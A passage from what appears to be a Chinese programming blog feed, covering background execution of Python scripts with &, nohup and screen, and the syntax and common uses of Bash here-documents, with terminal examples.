class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;HelloWorld: &quot;</span>, i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)  <span class="comment">#每输出一行就休眠1秒</span></span><br></pre></td></tr></table></figure><p>首先是只有输出的情况，会在前台输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:52:59]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python test.py &amp;</span></span><br><span class="line">[1] 30213</span><br><span class="line">HelloWorld:  0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:53:07]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">HelloWorld:  1</span></span><br><span class="line">HelloWorld:  2</span><br><span class="line">HelloWorld:  3</span><br><span class="line"></span><br><span class="line">[1]  + 30213 done       python test.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:53:11]</span></span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>可以看出我们通过 <code>python test.py &amp;</code>将其放在后台执行，然而输出还是在前台，且和<code># violetv at manjaro in ~/testsh [16:53:07]</code>有些交叉混乱。因此，如果我们不想这样，我们可以将标准输出和错误输出重定向至（普通或者设备）文件。例如：<code>python test.py &amp;&gt;/dev/null &amp;</code> 或<code>python test.py &gt; result.txt &amp;</code></p><h3 id="输入">输入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入循环次数：&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;HelloWorld: &quot;</span>, i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)  <span class="comment">#每输出一行就休眠1秒</span></span><br></pre></td></tr></table></figure><h4 id="不常用操作">不常用操作</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python test.py &gt; result.txt &amp;</span></span><br><span class="line">[1] 30598</span><br><span class="line">[1]  + 30598 suspended (tty input)  python test.py &gt; result.txt</span><br></pre></td></tr></table></figure><p>可以看到 <code>suspended (tty input)</code>说明它在等待前台终端输入，然而它又在后台运行，它无法获取不到前台输入，因此它就在后台一直等着前台输入（挂着，相当于僵尸进程）。这种情况，我们需要使用 <code>fg</code>(这里只有一个后台任务，所以没有加<code>%n</code>)，再把它调到前台进行输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [16:59:33]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">fg</span></span></span><br><span class="line">[1]  + 30598 continued  python test.py &gt; result.txt</span><br><span class="line">3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:04:02]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> result.txt</span></span><br><span class="line">请输入循环次数：HelloWorld:  0</span><br><span class="line">HelloWorld:  1</span><br><span class="line">HelloWorld:  2</span><br></pre></td></tr></table></figure><h4 id="常用操作">常用操作</h4><p>重定向该任务的输入：</p><ol type="1"><li><p>重定向文件</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:10:50]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> loop_num.txt</span></span><br><span class="line">4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:11:21]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python test.py &lt; loop_num.txt &amp;&gt;/dev/null &amp;</span></span><br><span class="line">[1] 31297</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:11:26]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[1]  + 31297 <span class="keyword">done</span>       python test.py &lt; loop_num.txt &amp;&gt; /dev/null</span></span><br></pre></td></tr></table></figure></p></li><li><p>其他命令结果+管道</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:10:00]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> 3 |python test.py &amp;&gt;/dev/null &amp;</span></span><br><span class="line">[1] 31159 31160</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [17:10:19]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[1]  + 31159 <span class="keyword">done</span>       <span class="built_in">echo</span> 3 |</span></span><br><span class="line">    31160 done       python test.py &amp;&gt; /dev/null</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="原理探究"><code>&amp;</code> 原理探究</h2><p>我们常常用来终止任务的 <code>Ctrl+C</code> 快捷键，本质是向该任务发送<code>SIGINT</code> 信号，然后任务收到该信号，终止。而<code>&amp;</code> 则忽略 <code>SIGINT</code>信号，因此，对后台程序而言，我们无法通过该快捷键来终止。</p><p>我们日常使用的 Ctrl+z 和 <code>&amp;</code>可以达到相同的效果（只不过前者要人手动按快捷键，不利于自动化），二者都是通过向程序发送<code>SIGTSTP</code> 信号，使其后台挂起的。</p><p>我们两种方法人为终止它：</p><ol type="1"><li>查找其 PID，使用 <code>kill</code> 命令人为发送终止信号。</li><li>使用 <code>jobs</code> 查看其为第 n 个后台进程，确定 n， 使用<code>fg %n</code> 将其调到前台，然后使用 <code>Ctrl+C</code>将其终止。</li></ol><h2 id="不受终端挂断影响">不受终端挂断影响</h2><p><code>nohup</code>： 即 no hang up，不挂断的运行，通过在命令前加<code>nohup</code>，就可以在断开终端的时候，不影响的继续了。这个在我们ssh 远程连接服务器，在服务器上执行耗时任务的时候，极其有用。</p><p>例如：<code>nohup sleep 2000</code>,然后关闭终端。再打开使用<code>ps aux|grep sleep</code> 查看, 它仍然运行。</p><p>注意：使用 <code>nohup</code>时，如果不指定输出文件，默认输出到当前目录下的<code>nohup.out</code>文件</p><h2 id="nohup-原理探究"><code>nohup</code> 原理探究</h2><p>终端挂断的时候，会向之前终端启动的程序发送 <code>SIGHUP</code>信号，使得这些任务终止。而 <code>nohup</code> 的意思就是忽略<code>SIGHUP</code> 信号，因此当运行 <code>nohup sleep 2000</code>的时候， 关闭 shell, 那么这个进程还是存在的。</p><h2 id="综合">综合</h2><p>对于 <code>sleep 2000 &amp;</code> 后台命令，我们关闭 shell的时候，向之前终端启动的所有程序发送 <code>SIGHUP</code>信号，它也不例外，照样终止。</p><p>对于 <code>nohup sleep 2000</code> 不挂断命令，我们按 Ctrl+C的时候，向该进程发送 <code>SIGINT</code> 信号，该进程照样终止。</p><p>总结，二者都只是对对应的一个信号进行了忽略，不能忽略其他的。</p><p>但是如果在远程 ssh连接服务器，我们想在一个终端里面执行耗时任务的同时，干别的事情怎么办？</p><p>那就将二者结合起来，就可以实现在后台运行（可以让我们接着用前台，而且后台任务不会因为<code>Ctrl+C</code> 终止），且不受终端挂断影响。</p><h2 id="screen">screen</h2><p><code>screen</code> is good for interactive processes, where youmight need to detach and reattach a session. <code>nohup</code> is bestfor unattended processes like userspace daemons or processes you willcheck on later.</p><p><code>screen</code> 一般是我们交互，需要实时看结果的时候用的，<code>nohup</code> 一般是我们需要等最后看结果时用的。</p><p>screen 预装在大多数 linux 机器上，可以使用<code>screen --version</code> 检查它是否被安装。</p><p>一般流程:</p><ol type="1"><li><p><code>screen -S session_name</code> 创建一个名为 session_name 的session 会话</p></li><li><p>在终端里正常进行你的工作,甚至是进行一些占用前台终端带输出的耗时任务</p></li><li><p>然后终端突然断开（ssh 断开或者电脑断电）</p></li><li><p>你重连终端</p><ol type="1"><li><p><code>screen -list</code> 或者 <code>screen -ls</code> 查看screen 的列表，也就是 session 列表。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">VM-0-17-ubuntu% </span><span class="language-bash">screen -list</span></span><br><span class="line">There are screens on:</span><br><span class="line">    9408.test   (06/26/2020 10:28:03 AM)    (Detached)</span><br><span class="line">    9256.pts-0.VM-0-17-ubuntu   (06/26/2020 10:27:41 AM)    (Detached)</span><br><span class="line">    8127.test   (06/26/2020 10:21:17 AM)    (Detached)</span><br><span class="line">    29226.pts-0.VM-0-17-ubuntu  (06/24/2020 10:45:18 AM)    (Detached)</span><br><span class="line">4 Sockets in /run/screen/S-ubuntu.</span><br></pre></td></tr></table></figure></p><p>detached(分离），说明你当前与该 session 分离，即：不处于该 session中</p><p>如果你在一个 screen session 里面运行该命令，则有类似结果</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">VM-0-17-ubuntu% </span><span class="language-bash">screen -list</span></span><br><span class="line">There are screens on:</span><br><span class="line">        9408.test       (06/26/2020 10:28:02 AM)        (Attached)</span><br><span class="line">        9256.pts-0.VM-0-17-ubuntu       (06/26/2020 10:27:40 AM)        (Detached)</span><br><span class="line">        8127.test       (06/26/2020 10:21:16 AM)        (Detached)</span><br><span class="line">        29226.pts-0.VM-0-17-ubuntu      (06/24/2020 10:45:17 AM)        (Detached)</span><br><span class="line">4 Sockets in /run/screen/S-ubuntu.</span><br></pre></td></tr></table></figure></p><p>其中 (Attached) 标识的便是你当前所在的 screen session。</p><p>你可以使用快捷键 <code>Ctrl+a d</code>（这是先按 ctrl+a，再按 ctrl+d的意思）在任何时候 detach 出一个 screen session。</p></li><li><p><code>screen -r [session]</code> 一般<code>[session]</code>我们写前面的数字即可，如：9408，当然如果 tab 补全写为 9408.test也可，只要能唯一表示就行。 例如：<code>screen -r 9408.test</code></p></li><li><p><code>exit</code> 或者 <code>Ctrl+d</code> 终止一个 screensession</p></li></ol></li></ol><h2 id="结论">结论</h2><p>使用 <code>&amp;</code> 后台运行程序：</p><ol type="1"><li>结果会输出到终端</li><li>使用 Ctrl + C 发送 SIGINT 信号，程序忽略</li><li>关闭 session 发送 SIGHUP 信号，程序关闭</li></ol><p>使用 <code>nohup</code> 运行程序：</p><ol type="1"><li>结果默认会输出到 nohup.out</li><li>使用 Ctrl + C 发送 SIGINT 信号，程序关闭</li><li>关闭 session 发送 SIGHUP 信号，程序忽略</li></ol><p>使用 <code>nohup</code> 和 <code>&amp;</code>配合来启动程序，同时忽略 SIGINT 和 SIGHUP 信号</p><p>最佳实践方案：</p><p>不要将信息输出到终端标准输出，标准错误输出，而要用日志组件将信息记录到日志里</p><p><code>nohup</code> 命令可以将日志输入到文件中</p><p><code>screen</code> 适合交互实时, <code>nohup</code>适合无交互非实时，自动化.</p><h2 id="参考资料">参考资料</h2><p><a href="http://archive.ambermd.org/200501/0179.html">Re: AMBER:Suspended (tty input)</a></p><p><a href="https://www.cnblogs.com/mingyue5826/p/11572228.html">Linux中 nohup 和&amp;的用法和区别</a></p><p><ahref="https://blog.51cto.com/10808695/1841519">如何杀死，暂停，继续一个后台进程</a></p><p><a href="https://linuxize.com/post/how-to-use-linux-screen/">How ToUse Linux Screen</a></p><p><ahref="https://stackoverflow.com/questions/17072463/is-screen-better-than-nohup">Is“screen” better than “nohup”? [closed]</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bash Here document</title>
      <link href="/blog/2020/07/13/programming/shell/heredoc/"/>
      <url>/blog/2020/07/13/programming/shell/heredoc/</url>
      
        <content type="html"><![CDATA[<h2 id="场景">场景</h2><p>在编写 shell 脚本时，可能会遇到需要将 <code>多行文本块或代码</code>传递给 <code>交互式命令(如tee、cat或sftp)</code> 的情况。在 Bash 和其他shell(如 Zsh)中，<strong>Here document(Heredoc)是一种允许你向命令传递多行输入的重定向</strong>。</p><p>here 文档常被 shell 脚本用来生成菜单或被用来多行注释</p><h2 id="语法">语法</h2><p>HereDoc 语法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[COMMAND] &lt;&lt;[-] &#x27;DELIMITER&#x27;</span><br><span class="line">  HERE-DOCUMENT</span><br><span class="line">DELIMITER</span><br></pre></td></tr></table></figure><ol type="1"><li><p>第一行以可选命令开头，后面跟重定向操作符 <code>&lt;&lt;</code>和分隔符。</p></li><li><p>可以使用任何字符串作为分隔标识符，最常用的是 <code>EOF</code> 或<code>END</code>。</p></li><li><p>如果分隔符没有被引号包围， shell 将会在解析 here-document到命令前，替换解析所有变量、命令和特殊字符注：在字符串中，如果需要使用变量或者命令</p><ol type="1"><li><p>对于环境变量，使用 <code>$环境变量名</code>，如：<code>$PWD</code>、<code>$SHELL</code></p></li><li><p>对于命令，使用 <code>$(pwd)</code>、</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:22:05]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$PWD</span></span></span><br><span class="line">/home/violetv/testsh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:22:10]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(basename $PWD)</span>&quot;</span></span></span><br><span class="line">testsh</span><br></pre></td></tr></table></figure></p></li></ol><p>举例：<code>$PWD</code>、<code>$(whoami)</code>在使用没有被引号包围的分隔符的 heaeDoc中，不会被当作变量解析，只当一般字符串。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">无引号包围分隔符，解析</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF</span></span></span><br><span class="line">The current working directory is: $PWD</span><br><span class="line">You are logged in as: $(whoami)</span><br><span class="line">EOF</span><br><span class="line">The current working directory is: /home/violetv/testsh</span><br><span class="line">You are logged in as: violetv</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">有引号包围分隔符，不解析</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">violetv at manjaro in ~/testsh [10:48:56]</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="string">cat &lt;&lt;- &quot;EOF</span><span class="string">&quot;</span></span></span><br><span class="line"><span class="meta prompt_">heredocd&gt; </span><span class="language-bash"><span class="string">The current working directory is: <span class="variable">$PWD</span></span></span></span><br><span class="line"><span class="meta prompt_">heredocd&gt; </span><span class="language-bash"><span class="string">You are logged in as: <span class="subst">$(whoami)</span></span></span></span><br><span class="line"><span class="meta prompt_">heredocd&gt; </span><span class="language-bash"><span class="string">EOF</span></span></span><br><span class="line">The current working directory is: $PWD</span><br><span class="line">You are logged in as: $(whoami)</span><br></pre></td></tr></table></figure></p></li><li><p>here-document块可以包含字符串，变量，命令和任何其他类型的输入。</p></li><li><p>最后一行以分隔符结尾，<strong>分隔符前面不允许有Whitespace</strong>，否则会报错。 这也是为什么下面推荐当需要在 shell编写 hereDoc ，然后希望与其他缩进对齐时，使用 <code>&lt;&lt;-</code>的原因。</p></li><li><p>在重定向运算符 <code>&lt;&lt;</code> 后面加上减号 <code>-</code>将导致所有前导制表符被忽略。 这可以使你可以在 shell 脚本中编写 hereDoc时使用缩进，而不报错。但是注意：<strong>不允许使用前导 Whitespace字符(即：第 5 条讲的分隔符前面不允许有Whitespace)，只能使用制表符。</strong> 常见场景：如果在 shell语句或循环中使用 heredoc，请使用 <code>&lt;&lt;-</code>重定向操作是你的代码缩进时不报错。</p><ol type="1"><li><p>（推荐）使用减号，缩进结尾 EOF 不报错</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt;- EOF</span><br><span class="line">        Line with a leading tab</span><br><span class="line">        EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:54:34]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">Line with a leading tab</span><br></pre></td></tr></table></figure></p></li><li><p>（错误）：不使用减号，缩进结尾 EOF， 报错</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:55:11]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt; EOF</span><br><span class="line">        Line with a leading tab</span><br><span class="line">        EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:55:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">./test: line 5: warning: here-document at line 2 delimited by end-of-file (wanted `EOF&#x27;)</span><br><span class="line">./test: line 6: syntax error: unexpected end of file</span><br></pre></td></tr></table></figure></p></li><li><p>（不推荐）不使用减号，不缩进结尾 EOF， 不报错,但是有制表符输出</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:57:44]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt; EOF</span><br><span class="line">        Line with a leading tab</span><br><span class="line">EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [10:57:46]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">        Line with a leading tab</span><br></pre></td></tr></table></figure></p></li><li><p>分隔符前有前导 whitspace 报错</p></li></ol><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:10:03]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">test</span></span></span><br><span class="line">if true; then</span><br><span class="line">        cat &lt;&lt; EOF</span><br><span class="line">                Line with a leading tab</span><br><span class="line">        EOF</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:10:05]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test</span></span><br><span class="line">./test: line 5: warning: here-document at line 2 delimited by end-of-file (wanted `EOF&#x27;)</span><br><span class="line">./test: line 6: syntax error: unexpected end of file</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="常见使用">常见使用</h2><p>Here document 可以搭配这种命令使用，这里只介绍我常见的及我见过的</p><h3 id="使用-cat-输出多行">使用 cat 输出多行</h3><ol type="1"><li><p>终端中：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:11:45]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF</span></span></span><br><span class="line">The current working directory is $PWD</span><br><span class="line">So Who am I?, you are $(whoami)</span><br><span class="line">EOF</span><br><span class="line">The current working directory is /home/violetv/testsh</span><br><span class="line">So Who am I?, you are violetv</span><br></pre></td></tr></table></figure></p></li><li><p>脚本中</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if true; then</span><br><span class="line">    cat &lt;&lt;- EOF</span><br><span class="line">    Line with a leading tab.</span><br><span class="line">    EOF</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p></li><li><p>重定向到文件</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:27:51]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; test.txt</span></span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash"><span class="string">The current working directory is: $PWD</span></span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash"><span class="string">You are logged in as: $(whoami)</span></span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash"><span class="string">EOF</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [11:28:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test.txt</span></span><br><span class="line">The current working directory is: /home/violetv/testsh</span><br><span class="line">You are logged in as: violetv</span><br></pre></td></tr></table></figure></p></li><li><p>pipe heredoc</p><p>通过管道，使用 sed、awk等进行处理，然后也可以重定向或者追加到文件。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF | sed &#x27;s/e/QAQ/g&#x27;</span></span></span><br><span class="line">pipe heredoc&gt; Hello World</span><br><span class="line">pipe heredoc&gt; Linux Shell is powerful!</span><br><span class="line">pipe heredoc&gt; EOF</span><br><span class="line">HQAQllo World</span><br><span class="line">Linux ShQAQll is powQAQrful!</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="shell-使用-python-执行脚本">shell 使用 python 执行脚本</h3><p>这个不常用，在 shell 脚本中使用 heredoc 达到执行 python代码的目的。shell 可以使用识别 heredoc， python 不能识别。因此，不能再pyhton 中直接使用 shell，需要通过一般操作，如：os 模块，subprocess模块等。</p><p>一般我们都是 shell 和 expect 相互使用，不过 expect 我还没学 emm</p><p>heredoc 搭配 python 命令执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/sh</span></span><br><span class="line">if ping -c1 $1 &amp;&gt;/dev/null; then</span><br><span class="line">    python &lt;&lt;-EOF</span><br><span class="line">        print(&quot;ip is up&quot;)</span><br><span class="line">    EOF</span><br><span class="line">else</span><br><span class="line">    /usr/bin/python &lt;&lt;-EOF</span><br><span class="line">        print(&quot;ip is down&quot;)</span><br><span class="line">    EOF</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><p><a href="https://linuxize.com/post/bash-heredoc/#disqus_thread">BashHeredoc</a></p>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 帮助文档</title>
      <link href="/blog/2020/06/27/programming/python/1.basic/12.help_doc/"/>
      <url>/blog/2020/06/27/programming/python/1.basic/12.help_doc/</url>
      
